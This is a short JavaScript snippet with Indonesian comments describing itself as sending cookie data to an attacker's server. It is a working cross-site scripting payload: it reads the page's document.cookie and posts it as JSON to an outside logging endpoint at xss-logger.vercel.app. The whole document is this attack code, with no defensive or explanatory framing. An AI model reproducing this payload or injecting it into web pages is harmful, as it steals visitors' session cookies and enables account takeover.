// Kirim data cookie ke server penyerang
var stolenCookies = document.cookie;

// URL server penyerang
var attackerURL = 'https://xss-logger.vercel.app/logger';

// Kirim data ke URL penyerang
var xhr = new XMLHttpRequest();
xhr.open("POST", attackerURL, true);
xhr.setRequestHeader("Content-type", "application/json");
xhr.send(JSON.stringify({ "cookies": stolenCookies }));